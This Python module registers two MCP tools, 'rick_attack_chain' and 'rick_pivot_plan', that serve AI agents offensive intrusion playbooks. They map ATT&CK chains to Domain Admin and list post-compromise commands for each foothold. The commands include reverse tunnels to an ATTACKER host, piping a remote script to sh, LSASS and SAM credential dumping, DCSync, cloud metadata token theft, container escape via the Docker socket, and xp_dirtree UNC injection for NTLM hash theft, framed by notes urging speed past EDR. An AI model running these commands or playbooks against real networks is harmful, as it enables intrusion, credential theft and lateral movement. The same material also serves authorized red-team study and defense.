"""Offensive tools — attack chains and pivot plans."""

from rick_mcp.constants import CALLSIGN
from rick_mcp.formatting import _fmt, _safe_tool
from rick_mcp.models import (
    AttackChainInput,
    PivotInput,
)


async def rick_attack_chain(params: AttackChainInput) -> str:
    """MITRE ATT&CK kill chain mapper. Maps attack chains from starting position to objective. Think in chains, not isolated vulns."""
    chains = {
        "external_to_da": {
            "objective": "External Perimeter to Domain Admin",
            "chain": [
                {
                    "tactic": "Reconnaissance (TA0043)",
                    "techniques": [
                        "Subdomain enumeration",
                        "Employee OSINT",
                        "Credential leak hunting (breach DBs)",
                        "LinkedIn org chart mapping",
                    ],
                    "tools": ["Amass", "Subfinder", "theHarvester", "Dehashed"],
                },
                {
                    "tactic": "Initial Access (TA0001)",
                    "techniques": [
                        "Exploit public-facing app (T1190)",
                        "Phishing attachment (T1566.001)",
                        "Valid accounts from leaks (T1078)",
                        "VPN/RDP brute force",
                    ],
                    "tools": ["Burp Suite", "Nuclei", "GoPhish", "Hydra"],
                },
                {
                    "tactic": "Execution (TA0002)",
                    "techniques": [
                        "Command/scripting interpreter (T1059)",
                        "Exploitation for client execution (T1203)",
                        "User execution of payload (T1204)",
                    ],
                    "tools": ["Metasploit", "Custom Python", "msfvenom"],
                },
                {
                    "tactic": "Persistence (TA0003)",
                    "techniques": [
                        "Web shell (T1505.003)",
                        "Scheduled task (T1053)",
                        "Registry run keys (T1547.001)",
                        "ADCS certificate persistence",
                    ],
                    "tools": ["Custom shells", "SharPersist", "Certify"],
                },
                {
                    "tactic": "Privilege Escalation (TA0004)",
                    "techniques": [
                        "Exploit ADCS misconfiguration (ESC1-ESC8)",
                        "Kerberoasting (T1558.003)",
                        "AS-REP Roasting",
                        "Token impersonation (T1134)",
                        "Potato attacks",
                    ],
                    "tools": ["Rubeus", "Certify", "PrintSpoofer", "GodPotato"],
                },
                {
                    "tactic": "Credential Access (TA0006)",
                    "techniques": ["LSASS dump (T1003.001)", "DCSync (T1003.006)", "Kerberoast crack", "NTLM relay"],
                    "tools": ["Mimikatz", "Impacket secretsdump", "Hashcat", "ntlmrelayx"],
                },
                {
                    "tactic": "Lateral Movement (TA0008)",
                    "techniques": ["Pass-the-hash (T1550.002)", "PSExec (T1569.002)", "WMI (T1047)", "RDP (T1021.001)"],
                    "tools": ["CrackMapExec", "Impacket", "Evil-WinRM"],
                },
                {
                    "tactic": "Domain Admin",
                    "techniques": [
                        "DCSync all hashes",
                        "Golden ticket (T1558.001)",
                        "Skeleton key",
                        "AdminSDHolder abuse",
                    ],
                    "tools": ["Impacket", "Mimikatz", "BloodHound for path validation"],
                },
            ],
            "rick_note": "This is the classic chain. ADCS is the shortcut most people miss. BloodHound maps the path — you walk it.",
        },
        "phishing_to_lateral": {
            "objective": "Phishing Foothold to Lateral Movement",
            "chain": [
                {
                    "tactic": "Initial Access (TA0001)",
                    "techniques": [
                        "Spearphishing attachment (T1566.001)",
                        "HTML smuggling (T1027.006)",
                        "ISO/LNK payloads bypassing MOTW",
                        "QR code phishing",
                    ],
                    "tools": ["GoPhish", "Custom payloads", "Evilginx2"],
                },
                {
                    "tactic": "Execution (TA0002)",
                    "techniques": [
                        "PowerShell (T1059.001)",
                        "VBA macro execution",
                        "DLL side-loading (T1574.002)",
                        "ClickOnce deployment",
                    ],
                    "tools": ["Custom PS scripts", "msfvenom", "Donut"],
                },
                {
                    "tactic": "Defense Evasion (TA0005)",
                    "techniques": [
                        "AMSI bypass (T1562.001)",
                        "ETW patching",
                        "Process hollowing (T1055.012)",
                        "Timestomping (T1070.006)",
                    ],
                    "tools": ["Custom loaders", "ScareCrow", "Artifact Kit"],
                },
                {
                    "tactic": "Discovery (TA0007)",
                    "techniques": [
                        "Domain trust discovery (T1482)",
                        "Network share enum (T1135)",
                        "Permission group discovery (T1069)",
                        "System info (T1082)",
                    ],
                    "tools": ["BloodHound", "PowerView", "ADRecon"],
                },
                {
                    "tactic": "Credential Access (TA0006)",
                    "techniques": [
                        "LSASS access (T1003.001)",
                        "Credential manager (T1555.004)",
                        "Browser saved creds (T1555.003)",
                        "Token theft",
                    ],
                    "tools": ["Mimikatz", "SharpChrome", "Rubeus"],
                },
                {
                    "tactic": "Lateral Movement (TA0008)",
                    "techniques": [
                        "SMB/admin shares (T1021.002)",
                        "WinRM (T1021.006)",
                        "DCOM (T1021.003)",
                        "RDP hijacking",
                    ],
                    "tools": ["CrackMapExec", "Evil-WinRM", "Impacket"],
                },
            ],
            "rick_note": "The phishing chain is about speed after landing. Enumerate fast, escalate faster, move before EDR catches up.",
        },
        "web_to_internal": {
            "objective": "Web Application to Internal Network Access",
            "chain": [
                {
                    "tactic": "Initial Access (TA0001)",
                    "techniques": [
                        "SQL injection to OS command (T1190)",
                        "File upload to web shell",
                        "SSRF to internal services",
                        "Deserialization RCE",
                    ],
                    "tools": ["Burp Suite", "SQLMap", "Custom shells"],
                },
                {
                    "tactic": "Execution (TA0002)",
                    "techniques": [
                        "Web shell command execution",
                        "Reverse shell callback",
                        "Scheduled task creation",
                        "Database command execution (xp_cmdshell, COPY TO)",
                    ],
                    "tools": ["Custom shells", "netcat/socat", "Metasploit"],
                },
                {
                    "tactic": "Discovery (TA0007)",
                    "techniques": [
                        "Internal network scanning from web server",
                        "Database credential harvesting",
                        "Config file enumeration",
                        "Cloud metadata (169.254.169.254)",
                    ],
                    "tools": ["Nmap (from pivot)", "Custom scripts"],
                },
                {
                    "tactic": "Credential Access (TA0006)",
                    "techniques": [
                        "Database connection strings",
                        "Config files with creds",
                        "Environment variables",
                        "Service account tokens",
                        "Cloud instance metadata IAM",
                    ],
                    "tools": ["Custom enumeration", "cloud CLI tools"],
                },
                {
                    "tactic": "Pivoting",
                    "techniques": [
                        "SOCKS proxy through web shell",
                        "Reverse SSH tunnel",
                        "Chisel/Ligolo-ng tunnel",
                        "DNS tunneling",
                    ],
                    "tools": ["Chisel", "Ligolo-ng", "SSH", "dnscat2"],
                },
                {
                    "tactic": "Lateral Movement (TA0008)",
                    "techniques": [
                        "Pivot to internal hosts via tunnel",
                        "Credential reuse across services",
                        "Database link crawling",
                        "Cloud pivot to other services",
                    ],
                    "tools": ["Proxychains + CrackMapExec", "Impacket through tunnel"],
                },
            ],
            "rick_note": "Web to internal is the bread and butter. SSRF to cloud metadata is the fast lane. The tunnel is the bridge — Chisel or Ligolo-ng, pick your weapon.",
        },
        "cloud_to_onprem": {
            "objective": "Cloud Compromise to On-Premises Access",
            "chain": [
                {
                    "tactic": "Initial Access (TA0001)",
                    "techniques": [
                        "Compromised cloud credentials",
                        "OAuth app consent phishing",
                        "Misconfigured storage/permissions",
                        "Exposed cloud management APIs",
                    ],
                    "tools": ["Az CLI", "AWS CLI", "ROADtools"],
                },
                {
                    "tactic": "Privilege Escalation (TA0004)",
                    "techniques": [
                        "Service principal abuse",
                        "IAM policy escalation",
                        "Managed identity exploitation",
                        "Cross-account role assumption",
                    ],
                    "tools": ["Pacu", "MicroBurst", "ScoutSuite"],
                },
                {
                    "tactic": "Discovery (TA0007)",
                    "techniques": [
                        "Enumerate hybrid AD connect",
                        "Find VPN/ExpressRoute/DirectConnect configs",
                        "Map cloud-to-onprem trust relationships",
                        "Identify sync accounts",
                    ],
                    "tools": ["ROADtools", "AADInternals", "Az CLI"],
                },
                {
                    "tactic": "Credential Access (TA0006)",
                    "techniques": [
                        "Extract Azure AD Connect sync creds",
                        "Key Vault secret extraction",
                        "Secrets Manager/SSM parameters",
                        "Token theft from cloud workloads",
                    ],
                    "tools": ["AADInternals", "Az CLI", "AWS CLI"],
                },
                {
                    "tactic": "Lateral to On-Prem",
                    "techniques": [
                        "Use sync account creds on-prem",
                        "VPN access with cloud creds",
                        "Azure AD joined device PRT abuse",
                        "Pass cloud tokens to on-prem services",
                    ],
                    "tools": ["Impacket", "Evil-WinRM", "AADInternals"],
                },
            ],
            "rick_note": "Hybrid environments are the goldmine. Azure AD Connect sync accounts often have DCSync rights. Cloud is the new perimeter — and most orgs don't know it.",
        },
        "insider_threat": {
            "objective": "Insider Threat Simulation (Authorized)",
            "chain": [
                {
                    "tactic": "Starting Position",
                    "techniques": [
                        "Standard domain user credentials",
                        "Corporate workstation access",
                        "VPN/remote access",
                        "Email access",
                    ],
                    "tools": ["Standard corporate tools"],
                },
                {
                    "tactic": "Discovery (TA0007)",
                    "techniques": [
                        "BloodHound enumeration",
                        "Share permission analysis",
                        "Sensitive file discovery (T1083)",
                        "Email/Teams data mining",
                        "Org chart analysis",
                    ],
                    "tools": ["BloodHound", "Snaffler", "PowerView"],
                },
                {
                    "tactic": "Collection (TA0009)",
                    "techniques": [
                        "Sensitive data in shares (T1039)",
                        "Email collection (T1114)",
                        "Database access with app creds",
                        "Source code access",
                        "Cloud storage enumeration",
                    ],
                    "tools": ["Snaffler", "Custom scripts", "Git"],
                },
                {
                    "tactic": "Privilege Escalation (TA0004)",
                    "techniques": [
                        "Kerberoasting (T1558.003)",
                        "AS-REP Roasting",
                        "ADCS abuse",
                        "Local admin reuse",
                        "GPP passwords",
                    ],
                    "tools": ["Rubeus", "Certify", "CrackMapExec"],
                },
                {
                    "tactic": "Exfiltration (TA0010)",
                    "techniques": [
                        "Data staging (T1074)",
                        "Exfil over web (T1048.002)",
                        "DNS exfiltration",
                        "Cloud sync exfil",
                    ],
                    "tools": ["Custom scripts", "rclone"],
                },
            ],
            "rick_note": "Insider sims prove what a disgruntled employee with a badge can do. Snaffler finds the crown jewels on shares. Usually takes less than a day to find sensitive data.",
        },
        "supply_chain": {
            "objective": "Supply Chain Attack Simulation",
            "chain": [
                {
                    "tactic": "Reconnaissance (TA0043)",
                    "techniques": [
                        "Third-party vendor mapping",
                        "Software dependency analysis",
                        "CI/CD pipeline enumeration",
                        "Package registry analysis",
                    ],
                    "tools": ["Custom OSINT", "Snyk", "npm audit"],
                },
                {
                    "tactic": "Initial Access (TA0001)",
                    "techniques": [
                        "Compromised dependency (T1195.002)",
                        "CI/CD pipeline injection",
                        "Typosquatting packages",
                        "Compromised build tooling",
                    ],
                    "tools": ["Custom analysis", "Dependency-Track"],
                },
                {
                    "tactic": "Execution (TA0002)",
                    "techniques": [
                        "Malicious package install scripts",
                        "Build pipeline code injection",
                        "Compromised container images",
                        "Git hook manipulation",
                    ],
                    "tools": ["Custom payloads"],
                },
                {
                    "tactic": "Persistence (TA0003)",
                    "techniques": [
                        "Backdoored dependency pinning",
                        "CI/CD webhook persistence",
                        "Container image tagging",
                        "Compromised signing keys",
                    ],
                    "tools": ["Custom tooling"],
                },
                {
                    "tactic": "Impact Assessment",
                    "techniques": [
                        "Blast radius analysis",
                        "Downstream consumer mapping",
                        "Data flow tracking",
                        "Trust boundary analysis",
                    ],
                    "tools": ["Custom analysis", "SBOM tools"],
                },
            ],
            "rick_note": "Supply chain is the frontier. Most orgs trust their dependencies blindly. CI/CD pipelines are the new domain admin — compromise the build, own everything downstream.",
        },
    }
    s = params.scenario.lower().strip()
    chain = chains.get(s)
    if not chain:
        return f"Error: Unknown scenario '{s}'. Available: {', '.join(chains.keys())}"
    if params.target_environment:
        chain["target_environment"] = params.target_environment
    chain["authorization"] = "AUTHORIZED ENGAGEMENTS ONLY — Attack chains are for planning authorized operations."
    chain["mitre_reference"] = "https://attack.mitre.org/"
    return _fmt(chain, params.response_format, title=f"{CALLSIGN} Attack Chain")


async def rick_pivot_plan(params: PivotInput) -> str:
    """'I'm in, now what?' Pivoting and lateral movement playbook by compromised position. Tunneling, proxying, credential reuse."""
    plans: dict[str, dict[str, object]] = {
        "linux_webserver": {
            "position": "Compromised Linux Web Server",
            "immediate_actions": [
                "whoami && id — know your user and groups",
                "ip addr / ifconfig — identify all network interfaces (dual-homed?)",
                "cat /etc/passwd — enumerate local users",
                "env / printenv — check for creds in environment variables",
                "find / -name '*.conf' -o -name '*.config' -o -name '*.env' 2>/dev/null — config files with creds",
                "cat /proc/net/arp — identify adjacent hosts",
                "ss -tlnp / netstat -tlnp — listening services and established connections",
                "mount / df -h — mounted filesystems, NFS shares",
                "crontab -l && ls -la /etc/cron* — scheduled tasks",
            ],
            "credential_hunting": [
                "Database connection strings in web app configs",
                ".bash_history for passwords in commands",
                "SSH keys (~/.ssh/id_rsa, authorized_keys)",
                "/var/www/ config files (wp-config.php, .env, settings.py)",
                "Docker environment variables / docker inspect",
                "Cloud metadata: curl http://169.254.169.254/latest/meta-data/iam/",
                "/etc/shadow if readable (rare but check)",
                "Credential files: /opt/, /tmp/, /var/backups/",
            ],
            "tunneling": {
                "chisel": "# On attacker: chisel server -p 8080 --reverse\n# On target: ./chisel client ATTACKER:8080 R:socks",
                "ligolo_ng": "# On attacker: ligolo-proxy -selfcert\n# On target: ./ligolo-agent -connect ATTACKER:11601 -ignore-cert",
                "ssh_dynamic": "ssh -D 9050 -N -f user@pivot_host  # SOCKS proxy",
                "ssh_local": "ssh -L 8445:INTERNAL_TARGET:445 user@pivot  # Port forward specific service",
                "ssh_reverse": "ssh -R 9050 user@attacker  # Reverse SOCKS from target to you",
            },
            "lateral_movement": [
                "SSH with harvested keys/creds to other Linux hosts",
                "Database connections to internal DB servers",
                "NFS/SMB mounts to access file shares",
                "Proxychains + nmap through SOCKS tunnel for internal scanning",
                "Ansible/Salt/Puppet — check for config management with stored creds",
            ],
            "privesc_quick_check": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            "rick_note": "Web servers are the beach head. They're dual-homed more often than you think. Check every interface, every config file. The database creds in wp-config.php are worth more than the web shell.",
        },
        "windows_workstation": {
            "position": "Compromised Windows Workstation",
            "immediate_actions": [
                "whoami /all — user, groups, privileges",
                "ipconfig /all — interfaces, DNS, domain info",
                "net user /domain — domain user enumeration",
                "net group 'Domain Admins' /domain — who's DA",
                "systeminfo — OS version, patches, hotfixes",
                "tasklist /v — running processes (AV, EDR?)",
                "netstat -ano — connections and listening ports",
                "arp -a — adjacent hosts",
                "cmdkey /list — stored credentials",
                "dir C:\\Users\\ — who logs into this machine",
            ],
            "credential_hunting": [
                "cmdkey /list — Windows credential manager",
                "dir /s /b C:\\Users\\*password* C:\\Users\\*cred* — credential files",
                "Browser saved passwords (SharpChrome, SharpWeb)",
                "WiFi passwords: netsh wlan show profiles / export",
                "KeePass databases: dir /s /b *.kdbx",
                "Check Sticky Notes: C:\\Users\\*\\AppData\\Local\\Packages\\*StickyNotes*",
                "DPAPI blobs for master key decryption",
                "Vault credentials",
            ],
            "tunneling": {
                "chisel": "# chisel.exe client ATTACKER:8080 R:socks",
                "ligolo_ng": "# ligolo-agent.exe -connect ATTACKER:11601 -ignore-cert",
                "netsh_portfwd": "netsh interface portproxy add v4tov4 listenport=8445 listenaddress=0.0.0.0 connectport=445 connectaddress=INTERNAL_TARGET",
                "ssh_exe": "# Windows 10+ has built-in SSH: ssh -D 9050 -N user@attacker",
            },
            "lateral_movement": [
                "CrackMapExec: cme smb SUBNET/24 -u USER -p PASS — spray and pray",
                "Evil-WinRM: evil-winrm -i TARGET -u USER -p PASS",
                "PsExec: impacket-psexec DOMAIN/USER:PASS@TARGET",
                "WMI: impacket-wmiexec DOMAIN/USER:PASS@TARGET",
                "RDP: if you have GUI, xfreerdp or rdesktop through tunnel",
                "Pass-the-Hash: cme smb TARGET -u USER -H NTHASH",
                "DCOM: impacket-dcomexec DOMAIN/USER:PASS@TARGET",
            ],
            "privesc_quick_check": "# Upload and run WinPEAS\n# Or: PowerUp.ps1 — Invoke-AllChecks",
            "rick_note": "Workstations are credential goldmines. Users save passwords everywhere — browsers, KeePass, sticky notes, cmdkey. Harvest everything before you move.",
        },
        "windows_server": {
            "position": "Compromised Windows Server",
            "immediate_actions": [
                "whoami /all — check for SeImpersonatePrivilege, SeBackupPrivilege",
                "systeminfo — DC? Member server? Patch level?",
                "net group 'Domain Controllers' /domain — identify all DCs",
                "nltest /dclist:DOMAIN — DC enumeration",
                "Get-ADDomain / Get-ADForest — if PowerShell available",
                "tasklist /v — identify services, AV/EDR",
                "sc query — all services and their accounts",
                "netstat -ano — internal connections reveal infrastructure",
            ],
            "credential_hunting": [
                "LSASS dump: procdump -ma lsass.exe lsass.dmp (or comsvcs.dll MiniDump)",
                "SAM/SYSTEM/SECURITY: reg save HKLM\\SAM sam.bak",
                "NTDS.dit if DC: ntdsutil / Volume Shadow Copy",
                "DCSync if DA: impacket-secretsdump DOMAIN/DA:PASS@DC",
                "Service account credentials in registry",
                "IIS application pool identities",
                "SQL Server service accounts and linked servers",
                "Scheduled tasks running as privileged accounts",
                "GPP passwords (legacy but still found): Get-GPPPassword",
            ],
            "tunneling": {
                "chisel": "# chisel.exe client ATTACKER:8080 R:socks",
                "ligolo_ng": "# ligolo-agent.exe -connect ATTACKER:11601 -ignore-cert",
                "netsh_portfwd": "netsh interface portproxy add v4tov4 listenport=LOCAL connectport=REMOTE_PORT connectaddress=REMOTE_HOST",
            },
            "lateral_movement": [
                "DCSync all accounts if Domain Admin",
                "Golden Ticket for persistent domain access",
                "Silver Tickets for specific service access",
                "ADCS certificate request for any user",
                "AdminSDHolder modification for persistent DA",
                "Print Spooler abuse for relay to other DCs",
                "Trust relationship abuse for cross-forest",
            ],
            "rick_note": "If it's a DC, game over — DCSync everything. If it's a member server, hunt service account creds and SQL linked servers. Servers talk to other servers — follow the connections.",
        },
        "container": {
            "position": "Compromised Container (Docker/K8s Pod)",
            "immediate_actions": [
                "id — am I root in the container?",
                "cat /proc/1/cgroup — confirm containerized",
                "mount — check for sensitive mounts (/var/run/docker.sock!)",
                "env — environment variables with secrets",
                "cat /var/run/secrets/kubernetes.io/serviceaccount/token — K8s SA token",
                "ls -la /var/run/docker.sock — Docker socket mounted?",
                "ip addr — network interfaces, what network am I on?",
                "cat /etc/resolv.conf — DNS reveals cluster info",
                "df -h — volume mounts from host",
            ],
            "escape_vectors": [
                "Docker socket mounted → docker run -v /:/host --privileged → full host access",
                "Privileged container → mount host filesystem, load kernel modules",
                "CAP_SYS_ADMIN → mount cgroup escape (notify_on_release)",
                "Host PID namespace → nsenter to host",
                "Writable hostPath volumes → write to host filesystem",
                "K8s service account with cluster-admin → kubectl get secrets --all-namespaces",
            ],
            "credential_hunting": [
                "Environment variables (env | grep -i pass\\|key\\|secret\\|token)",
                "K8s secrets: kubectl get secrets (if SA has permissions)",
                "ConfigMaps with credentials",
                "Cloud metadata: curl http://169.254.169.254/",
                "Mounted volume files",
                "Docker image layers (history reveals build-time secrets)",
            ],
            "lateral_movement": [
                "K8s service account → enumerate and access other pods/namespaces",
                "Internal cluster DNS → discover services",
                "Cloud metadata IAM role → pivot to cloud resources",
                "Network scanning within cluster overlay network",
                "Access other containers via docker exec (if socket mounted)",
            ],
            "rick_note": "Docker socket mount = instant root on host. Check it first, every time. K8s service account tokens are the new domain creds — check what they can do. Container escape is the new privilege escalation.",
        },
        "cloud_instance": {
            "position": "Compromised Cloud Instance (EC2/Azure VM/GCE)",
            "immediate_actions": [
                "curl http://169.254.169.254/ — metadata service (IMDS)",
                "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ — AWS IAM role",
                "curl -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/' — Azure managed identity",
                "Check instance tags, user-data (often contains bootstrap scripts with creds)",
                "Cloud CLI tools installed? (aws, az, gcloud)",
                "env | grep -i AWS\\|AZURE\\|GCP\\|KEY\\|SECRET — cloud creds in env",
            ],
            "credential_hunting": [
                "Instance metadata IAM credentials (auto-rotating but useful NOW)",
                "User-data scripts with hardcoded creds",
                "Cloud CLI credential files (~/.aws/credentials, ~/.azure/)",
                "Application config files with cloud API keys",
                "Secrets Manager / Key Vault / Secret Manager access via instance role",
                "Other instances' metadata via SSRF if proxy-able",
            ],
            "cloud_pivot": [
                "Enumerate IAM permissions: what can this role/identity do?",
                "List S3/Blob/GCS buckets accessible to this role",
                "Check for cross-account role assumption",
                "Enumerate other compute instances",
                "Access managed databases (RDS, Azure SQL) via IAM auth",
                "Check for VPC peering / VPN to on-premises",
                "Lambda/Function/Cloud Function code — often contains secrets",
            ],
            "tunneling": {
                "chisel": "# chisel client ATTACKER:8080 R:socks — tunnel through cloud instance to internal VPC",
                "ssm_tunnel": "# AWS SSM: aws ssm start-session --target INSTANCE_ID (no SSH needed)",
                "ssh_to_internal": "Use cloud instance as jump box to VPC-internal resources",
            },
            "rick_note": "Cloud instances are the pivot point between cloud and internal. The metadata service is ALWAYS the first stop. IAM role permissions define your blast radius. Check what the role can touch — S3, Secrets Manager, other instances, databases. That's your map.",
        },
        "database_server": {
            "position": "Compromised Database Server",
            "immediate_actions": [
                "Identify DB type and version (MySQL, MSSQL, PostgreSQL, Oracle, MongoDB)",
                "Current user privileges — am I DBA/SA?",
                "List all databases and tables",
                "Check for linked servers (MSSQL: EXEC sp_linkedservers)",
                "Network connections from DB — what talks to this DB?",
                "Check for OS command execution capability",
            ],
            "os_command_execution": {
                "mssql": "xp_cmdshell 'whoami' — if SA, enable with sp_configure",
                "mysql": "SELECT sys_exec('whoami') — via UDF if FILE privilege",
                "postgresql": "COPY TO PROGRAM 'whoami' — if superuser",
                "oracle": "DBMS_SCHEDULER.CREATE_JOB with OS command",
                "mongodb": "db.adminCommand({}) — limited, but check for misconfig",
            },
            "credential_hunting": [
                "Database user password hashes — dump and crack",
                "Application connection strings stored in DB tables",
                "Linked server credentials (MSSQL)",
                "Database mail configurations with SMTP creds",
                "Job/agent configurations with credentials",
                "Transparent Data Encryption keys",
                "Application user tables (users, passwords, API keys)",
            ],
            "lateral_movement": [
                "MSSQL linked servers — crawl the chain (openquery cascading)",
                "Database links in Oracle — follow the links",
                "OS command execution → reverse shell → full pivot",
                "Credential reuse — DB admin passwords often reused on Windows/Linux",
                "UNC path injection (MSSQL) — steal NTLMv2 hashes: xp_dirtree '\\\\ATTACKER\\share'",
            ],
            "rick_note": "Databases are the connective tissue of every organization. MSSQL linked servers are the best kept secret — one SA account can chain through an entire environment. UNC path injection for hash stealing is chef's kiss. Always check linked servers.",
        },
        "network_device": {
            "position": "Compromised Network Device (Router/Switch/Firewall)",
            "immediate_actions": [
                "Identify device type and firmware version",
                "show running-config / show startup-config — full configuration",
                "show interfaces — all network segments",
                "show arp / show ip route — routing table and neighbor info",
                "show access-lists — firewall rules and ACLs",
                "show snmp — community strings",
                "show vlan — VLAN segmentation",
            ],
            "credential_hunting": [
                "Running config contains passwords (Type 5/7/8/9 hashes)",
                "SNMP community strings (often 'public' or 'private')",
                "TACACS+/RADIUS shared secrets",
                "VPN pre-shared keys",
                "Enable/privilege passwords",
                "SSH keys stored on device",
                "Type 7 passwords — instantly reversible",
            ],
            "network_pivot": [
                "Modify ACLs to allow traffic between segments",
                "Create GRE/VPN tunnels to bypass segmentation",
                "VLAN hopping if trunk ports misconfigured",
                "Route injection to redirect traffic",
                "SNMP write access → modify configs remotely",
                "Capture traffic (SPAN/mirror ports) for credential sniffing",
            ],
            "rick_note": "Network devices are infrastructure. Own the router, own the traffic. Type 7 passwords decode instantly. SNMP write access is root on a network device. This is where the builder's eye matters — understand the architecture to control it.",
        },
    }
    p = params.position.lower().strip()
    plan = plans.get(p)
    if not plan:
        return f"Error: Unknown position '{p}'. Available: {', '.join(plans.keys())}"
    result: dict[str, object] = dict(plan)
    if params.target_network:
        result["target_network"] = params.target_network
    result["authorization"] = "AUTHORIZED ENGAGEMENTS ONLY"
    return _fmt(result, params.response_format, title=f"{CALLSIGN} Pivot Plan")


def register(mcp):
    """Register tools on the MCP server."""
    mcp.tool(
        name="rick_attack_chain",
        annotations={
            "title": "ATT&CK Kill Chain Mapper",
            "readOnlyHint": True,
            "destructiveHint": False,
            "idempotentHint": True,
            "openWorldHint": False,
        },
    )(_safe_tool(rick_attack_chain))
    mcp.tool(
        name="rick_pivot_plan",
        annotations={
            "title": "Pivot & Lateral Movement Planner",
            "readOnlyHint": True,
            "destructiveHint": False,
            "idempotentHint": True,
            "openWorldHint": False,
        },
    )(_safe_tool(rick_pivot_plan))

    from rick_mcp.tools import offensive_tradecraft

    offensive_tradecraft.register(mcp)
